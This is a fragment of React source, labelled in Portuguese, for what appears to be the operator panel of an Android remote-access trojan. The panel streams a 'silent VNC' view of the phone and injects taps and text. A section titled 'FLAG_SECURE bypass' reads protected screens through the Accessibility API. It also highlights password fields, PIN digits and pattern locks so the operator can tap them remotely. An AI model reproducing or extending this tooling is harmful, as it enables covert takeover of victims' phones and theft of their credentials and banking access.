              width={APK_W} height={APK_H}
              className="vnc-canvas"
              onPointerDown={onPtrDown}
              onPointerMove={onPtrMove}
              onPointerUp={onPtrUp}
              onPointerCancel={onPtrUp}
              onContextMenu={onCtxMenu}
              onWheel={onWheel}
              style={{
                display: 'block', width: '100%', height: 'auto',
                borderRadius: mode === 'DUPLO' ? '0 0 0 0' : '0 0 8px 8px',
                cursor: vncOn ? 'crosshair' : 'default',
              }}
            />
            {/* Overlay: tap ripple + swipe preview — pointer-events:none */}
            <canvas
              ref={overlayRef}
              width={APK_W} height={APK_H}
              style={{
                position: 'absolute', inset: 0, width: '100%', height: '100%',
                pointerEvents: 'none', borderRadius: '0 0 8px 8px',
              }}
            />
            {!vncOn && (
              <div className="vnc-overlay">
                <div className="spin" />
                <div style={{ fontSize: 12, color: 'var(--text2)', marginTop: 8 }}>
                  Aguardando stream...
                </div>
              </div>
            )}
          </div>

          {/* Keyboard hint */}
          {vncOn && (
            <div style={{
              fontSize: 10, color: 'var(--text3)', textAlign: 'center',
              padding: '4px 0 2px', letterSpacing: .3,
            }}>
              ↑ Clique no canvas e digite para injetar texto direto
            </div>
          )}

          {/* VNC controls */}
          <div className="grid g2 mt6 mb8">
            <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ INICIAR</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ PARAR</button>
            <button className="btn btn-ghost btn-block btn-sm"
              onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
            <button className="btn btn-ghost btn-block btn-sm"
              onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
          </div>
          <div className="card card-sm mb8">
            <div className="row-sb mb4">
              <span className="txt-xs txt-dim">QUALIDADE JPEG</span>
              <span className="txt-xs txt-gold bold">{vncQual}%</span>
            </div>
            <input type="range" min="10" max="100" value={vncQual}
              style={{ width: '100%', accentColor: '#d4950a' }}
              onChange={e => {
                setVncQual(+e.target.value);
                sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
              }} />
          </div>
        </>
      )}

      {/* ══════════════════════════════════════════
          LY — LAYOUT OVERLAY
      ══════════════════════════════════════════ */}
      {showLy && (
        <div>
          {/* LY toolbar */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            padding: '5px 10px', borderRadius: '8px 8px 0 0',
            background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>LY</span>
            <span style={{ width: 1, height: 12, background: 'rgba(255,255,255,.12)' }} />
            {nodes.length > 0 && (
              <>
                <span style={{ fontSize: 10, color: '#fbbf24', fontWeight: 600 }}>
                  {nodes.filter(n=>n.clickable).length} TAP
                </span>
                <span style={{ fontSize: 10, color: '#c084fc' }}>
                  {nodes.filter(n=>n.isKeyboard).length} KBD
                </span>
                <span style={{ fontSize: 10, color: '#34d399' }}>
                  {nodes.filter(n=>n.scrollable).length} SCROLL
                </span>
                {nodes.filter(n=>n.password).length > 0 && (
                  <span style={{ fontSize: 10, color: '#f87171', fontWeight: 700 }}>
                    🔒 {nodes.filter(n=>n.password).length}
                  </span>
                )}
              </>
            )}
            <div className="row gap4" style={{ marginLeft: 'auto' }}>
              {/* Zoom toggle */}
              <button
                onClick={() => setLyZoom(v => v === 1 ? 1.7 : v === 1.7 ? 2.5 : 1)}
                className="btn btn-ghost btn-xs"
                style={{ fontSize: 10, fontWeight: 700, minWidth: 28 }}>
                {lyZoom === 1 ? '1×' : lyZoom === 1.7 ? '1.7×' : '2.5×'}
              </button>
              <button onClick={() => setShowLabels(v => !v)}
                className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`}
                style={{ fontSize: 10 }}>Aa</button>
              <button onClick={() => setLiveMode(v => !v)}
                className={`btn btn-xs ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                style={{ fontSize: 10 }}>
                {liveMode ? '🔴' : '⭕'}
              </button>
              <button onClick={() => sendCmd('REQUEST_HIERARCHY')}
                className="btn btn-ghost btn-xs" style={{ fontSize: 10 }}>↺</button>
            </div>
          </div>

          {/* Search bar */}
          <div style={{
            background: 'rgba(6,4,14,.9)',
            border: '1px solid rgba(255,255,255,.07)',
            borderTop: 'none', borderBottom: 'none',
            padding: '5px 10px',
          }}>
            <input
              className="input"
              style={{ width: '100%', fontSize: 11, padding: '4px 8px' }}
              placeholder="Buscar no canvas por texto ou classe..."
              value={lySearch}
              onChange={e => setLySearch(e.target.value)}
            />
          </div>

          {/* LY canvas (zoom via CSS transform on wrapper) */}
          <div style={{
            overflow: lyZoom > 1 ? 'auto' : 'hidden',
            border: '1px solid rgba(59,130,246,.2)',
            borderTop: 'none', borderRadius: '0 0 8px 8px',
            background: '#060810',
            minHeight: nodes.length ? undefined : 100,
          }}>
            <div style={{
              transform: `scale(${lyZoom})`,
              transformOrigin: 'top left',
              width: `${100 / lyZoom}%`,
              touchAction: 'none',
              cursor: 'crosshair',
            }}
              onPointerDown={onLyPtrDown}
              onPointerUp={onLyPtrUp}
              onPointerCancel={onLyPtrUp}
            >
              <canvas
                ref={lyRefCb}
                style={{ display: 'block', width: '100%' }}
              />
            </div>
            {!nodes.length && (
              <div style={{
                display: 'flex', flexDirection: 'column',
                alignItems: 'center', justifyContent: 'center',
                padding: 32, minHeight: 100,
              }}>
                <div style={{ fontSize: 28, marginBottom: 8, opacity: .4 }}>◻</div>
                <div style={{ fontSize: 11, color: 'var(--text3)', textAlign: 'center' }}>
                  Toque ↺ para carregar hierarquia de acessibilidade
                </div>
              </div>
            )}
          </div>

          {/* LY legend */}
          <div className="row gap4 mt6 mb6" style={{ flexWrap: 'wrap' }}>
            {[
              ['TAP', '#fbbf24'], ['EDIT', '#34d399'], ['SCROLL', '#4ade80'],
              ['KBD', '#c084fc'], ['PIN', '#60a5fa'], ['PWD', '#f87171'],
              ['OFF', '#475569'],
            ].map(([lbl, col]) => (
              <span key={lbl} style={{
                fontSize: 9, padding: '2px 7px', borderRadius: 4, fontWeight: 700,
                border: `1px solid ${col}55`, color: col, letterSpacing: .5,
              }}>{lbl}</span>
            ))}
          </div>

          {/* Selected node detail card */}
          {lySelected && (
            <div className="card card-sm mb8"
              style={{ border: `1px solid ${nodeColor(lySelected)}33` }}>
              <div className="row-sb mb6">
                <div>
                  <span style={{
                    fontSize: 11, fontWeight: 800, color: nodeColor(lySelected),
                    marginRight: 6,
                  }}>
                    {lySelected.cls.split('.').pop() || lySelected.cls}
                  </span>
                  {lySelected.focused && <span style={{ fontSize: 10, color: '#f8fafc' }}>⊙ FOCADO</span>}
                </div>
                <button className="btn btn-ghost btn-xs"
                  onClick={() => setLySelected(null)}>✕</button>
              </div>
              {lySelected.text && (
                <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)', marginBottom: 4 }}>
                  "{lySelected.text}"
                </div>
              )}
              {lySelected.hint && (
                <div style={{ fontSize: 11, color: 'var(--text3)', marginBottom: 4, fontStyle: 'italic' }}>
                  hint: {lySelected.hint}
                </div>
              )}
              {lySelected.id && (
                <div className="txt-xs txt-mono txt-dim mb4">
                  #{lySelected.id.split('/').pop()}
                </div>
              )}
              {lySelected.bounds && (
                <div className="txt-xs txt-mono txt-dim mb6">
                  [{lySelected.bounds.left},{lySelected.bounds.top}]→[{lySelected.bounds.right},{lySelected.bounds.bottom}]
                  {' '}({lySelected.bounds.right - lySelected.bounds.left}×{lySelected.bounds.bottom - lySelected.bounds.top}px)
                </div>
              )}
              {/* Action row */}
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                <button className="btn btn-gold btn-sm btn-block flex1"
                  style={{ minWidth: 60 }}
                  onClick={() => tapNode(lySelected)}>TAP</button>
                {lySelected.longClickable && (
                  <button className="btn btn-ghost btn-sm flex1" style={{ minWidth: 60 }}
                    onClick={() => {
                      const c = bCenter(lySelected.bounds);
                      if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 });
                    }}>HOLD</button>
                )}
                {lySelected.scrollable && (
                  <>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => {
                        const c = bCenter(lySelected.bounds);
                        if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y - 200, x2: c.x, y2: c.y + 200, duration: 150 });
                      }}>↓</button>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => {
                        const c = bCenter(lySelected.bounds);
                        if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y + 200, x2: c.x, y2: c.y - 200, duration: 150 });
                      }}>↑</button>
                  </>
                )}
                {lySelected.editable && (
                  <button className="btn btn-blue btn-sm flex1" style={{ minWidth: 60 }}
                    onClick={() => { tapNode(lySelected); setTimeout(() => setTypeText(''), 100); }}>
                    EDITAR
                  </button>
                )}
              </div>
              {/* PIN grid if pattern */}
              {lySelected.isPatternLock && lySelected.patternGrid && (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, marginTop: 8, maxWidth: 120 }}>
                  {lySelected.patternGrid.map((p, pi) => (
                    <button key={pi} className="btn btn-ghost btn-sm"
                      style={{ fontSize: 12, fontWeight: 700 }}
                      onClick={() => sendCmd('TAP', { x: p.x, y: p.y })}>
                      {pi + 1}
                    </button>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Quick PIN pad */}
          {nodes.filter(n => n.isPinDigit && n.text && n.clickable).length > 0 && (
            <div className="card card-sm mb8" style={{ border: '1px solid #60a5fa33' }}>
              <div className="txt-xs txt-dim mb6" style={{ color: '#60a5fa' }}>⌨ PIN</div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {nodes.filter(n => n.isPinDigit && n.text && n.clickable).map((nd, i) => (
                  <button key={i} className="btn btn-blue btn-sm"
                    style={{ minWidth: 38, fontSize: 15, fontWeight: 800 }}
                    onClick={() => tapNode(nd)}>{nd.text}</button>
                ))}
              </div>
            </div>
          )}

          <div style={{ height: 8 }} />
        </div>
      )}

      {/* ── Nav keys (always visible) ── */}
      <div className="section-title mt2">Navegação</div>
      <div className="grid g4 mb8">
        {[
          ['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE'],
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* ── Inject ── */}
      <div className="section-title">Injetar Texto / Toque Manual</div>
      <div className="card card-sm mb8">
        <div className="input-row mb8">
          <input className="input" placeholder="Texto para injetar..."
            value={typeText} onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
        </div>
        <div className="txt-xs txt-dim mb6">Coordenadas brutas (device px)</div>
        <div className="input-row">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 68 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 68 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
        </div>
      </div>

      {/* ══════════════════════════════════════════
          V2 — FLAG_SECURE BYPASS READER
      ══════════════════════════════════════════ */}
      {showReader && (
        <div>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            padding: '5px 10px', borderRadius: '8px 8px 0 0',
            background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
            marginBottom: 0,
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#4ade80', letterSpacing: 1 }}>
              🔓 V2 FLAG_SECURE BYPASS
            </span>
          </div>

          <div className="card card-sm" style={{ borderRadius: '0 0 8px 8px', marginBottom: 8 }}>
            <div className="row gap5 mb8" style={{ flexWrap: 'wrap' }}>
              <button className="btn btn-gold btn-sm"
                onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('Aguardando...', '#fbbf24'); }}>
                🌳 HIERARCHY
              </button>
              <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                onClick={() => setLiveMode(v => !v)}>
                {liveMode ? '⏹ LIVE OFF' : '🔴 LIVE ON'}
              </button>
              <button className="btn btn-ghost btn-sm"
                onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>👁 SR ON</button>
              <button className="btn btn-ghost btn-sm"
                onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>⏹ SR OFF</button>
              <button className="btn btn-ghost btn-sm"
                onClick={() => { setNodes([]); setLines([]); setRawData(''); setLySelected(null); }}>
                🗑 CLEAR
              </button>
            </div>

            {/* Tabs */}
            <div className="row gap5 mb8">
              {[['ocr','📄 OCR'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, lbl]) => (
                <button key={id} onClick={() => setSrTab(id)}
                  className={`btn btn-sm ${srTab === id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
              ))}
              {srTs && (
                <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
                  {new Date(srTs).toLocaleTimeString()}
                </span>
              )}
            </div>

            {/* Stats */}
            {nodes.length > 0 && (
              <div className="row gap5 mb8">
                <span className="pill pill-green"  style={{ fontSize: 10 }}>{nodes.filter(n=>n.text).length} txt</span>
                <span className="pill pill-gold"   style={{ fontSize: 10 }}>{nodes.filter(n=>n.clickable).length} tap</span>
                <span className="pill pill-purple" style={{ fontSize: 10 }}>{nodes.filter(n=>n.isKeyboard).length} kbd</span>
                <span className="pill pill-blue"   style={{ fontSize: 10 }}>{lines.length} linhas</span>
                {nodes.filter(n=>n.password).length > 0 && (
                  <span className="pill pill-red" style={{ fontSize: 10 }}>🔒 {nodes.filter(n=>n.password).length}</span>
                )}
              </div>
            )}

            {/* OCR */}
            {srTab === 'ocr' && (
              <div ref={ocrRef} style={{ maxHeight: 420, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
                {lines.length === 0 && (
                  <div className="no-data" style={{ padding: 36 }}>
                    <div style={{ fontSize: 32, marginBottom: 8 }}>🌳</div>
                    <div style={{ fontSize: 12 }}>Toque HIERARCHY para ler a tela</div>
                    <div style={{ fontSize: 10, color: 'var(--text3)', marginTop: 4 }}>
                      Bypass FLAG_SECURE via Accessibility API
                    </div>
                  </div>
                )}
                {lines.map((row, ri) => (
                  <div key={ri} style={{
                    display: 'flex', gap: 4, flexWrap: 'wrap', padding: '3px 6px',
                    borderRadius: 5, background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
                  }}>
                    {row.map((nd, ni) => (
                      <button key={ni} onClick={() => tapNode(nd)}
                        style={{
                          background: nd.isPinDigit ? 'rgba(96,165,250,.15)' :
                            nd.password ? 'rgba(248,113,113,.12)' :
                            nd.isKeyboard ? 'rgba(192,132,252,.12)' :
                            nd.clickable ? 'rgba(251,191,36,.12)' : 'rgba(255,255,255,.04)',
                          border: `1px solid ${
                            nd.isPinDigit ? '#60a5fa55' : nd.password ? '#f8717155' :
                            nd.isKeyboard ? '#c084fc55' : nd.clickable ? '#fbbf2455' : '#ffffff11'
                          }`,
                          borderRadius: 5, padding: '3px 8px',
                          color: nd.isPinDigit ? '#60a5fa' : nd.password ? '#f87171' :
                                 nd.isKeyboard ? '#c084fc' : nd.clickable ? '#fbbf24' : 'var(--text2)',
                          fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                          cursor: nd.clickable ? 'pointer' : 'default', fontFamily: 'var(--font)',
                          opacity: nd.enabled ? 1 : 0.5, transition: 'background .1s',
                        }}
                        title={`[${nd.bounds?.left},${nd.bounds?.top}→${nd.bounds?.right},${nd.bounds?.bottom}]`}
                      >
                        {nd.text}
                        {nd.password && <span style={{ marginLeft: 3, fontSize: 10 }}>🔒</span>}
                        {nd.checked  && <span style={{ marginLeft: 3, color: '#4ade80' }}>✓</span>}
                      </button>
                    ))}
                  </div>
                ))}
              </div>
            )}

            {/* Nodes */}
            {srTab === 'nodes' && (
              <div>
                <div className="input-row mb6">
                  <input className="input" placeholder="Filtrar..." value={filter}
                    onChange={e => setFilter(e.target.value)} />
                  <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
                    {filteredNodes.length}/{nodes.length}
                  </span>
                </div>
                <div style={{ maxHeight: 440, overflowY: 'auto' }}>
                  {filteredNodes.slice(0, 250).map((nd, i) => (
                    <div key={i}
                      style={{
                        padding: '7px 8px', marginBottom: 3, borderRadius: 6,
                        background: 'rgba(255,255,255,.03)',
                        borderLeft: `3px solid ${nodeColor(nd)}`,
                        paddingLeft: 8 + nd.depth * 5,
                        cursor: nd.clickable ? 'pointer' : 'default',
                        opacity: nd.enabled ? 1 : 0.5,
                      }}
                      onClick={() => nd.clickable && tapNode(nd)}
                    >
                      <div className="row-sb">
                        <div style={{ flex: 1, minWidth: 0 }}>
                          {nd.text && (
                            <div style={{ fontWeight: 600, fontSize: 12, color: 'var(--text)', marginBottom: 2 }}>
                              {nd.text}
                            </div>
                          )}
                          <div style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'var(--font-mono)',
                            overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {nd.cls.split('.').pop()}
                            {nd.id && <span style={{ marginLeft: 6 }}>#{nd.id.split('/').pop()}</span>}
                          </div>
                        </div>
                        <div style={{ display: 'flex', gap: 3, alignItems: 'center', flexShrink: 0 }}>
                          {nd.clickable    && <span style={{ fontSize: 9, color: '#fbbf24', fontWeight: 700 }}>TAP</span>}
                          {nd.scrollable   && <span style={{ fontSize: 9, color: '#4ade80' }}>SCROLL</span>}
                          {nd.isPinDigit   && <span style={{ fontSize: 9, color: '#60a5fa', fontWeight: 700 }}>PIN</span>}
                          {nd.isKeyboard   && <span style={{ fontSize: 9, color: '#c084fc' }}>⌨</span>}
                          {nd.isPatternLock && <span style={{ fontSize: 9, color: '#818cf8' }}>⊞</span>}
                          {nd.password     && <span style={{ fontSize: 9, color: '#f87171' }}>🔒</span>}
                          {nd.checked      && <span style={{ fontSize: 9, color: '#4ade80' }}>✓</span>}
                        </div>
                      </div>
                      {nd.bounds && (
                        <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--font-mono)', marginTop: 3 }}>
                          {nd.bounds.left},{nd.bounds.top} → {nd.bounds.right},{nd.bounds.bottom}
                          {' '}({nd.bounds.right-nd.bounds.left}×{nd.bounds.bottom-nd.bounds.top})
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Raw */}
            {srTab === 'raw' && (
              <div>
                <div className="row-sb mb6">
                  <span className="txt-xs txt-dim">{rawData.length} chars · {nodes.length} nós</span>
                  <button className="btn btn-ghost btn-xs"
                    onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
                    📋 COPIAR
                  </button>
                </div>
                <div className="term" style={{ height: 400, overflowY: 'auto', whiteSpace: 'pre', fontSize: 10, lineHeight: 1.5 }}>
                  {rawData || 'Nenhum dado — toque HIERARCHY.'}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
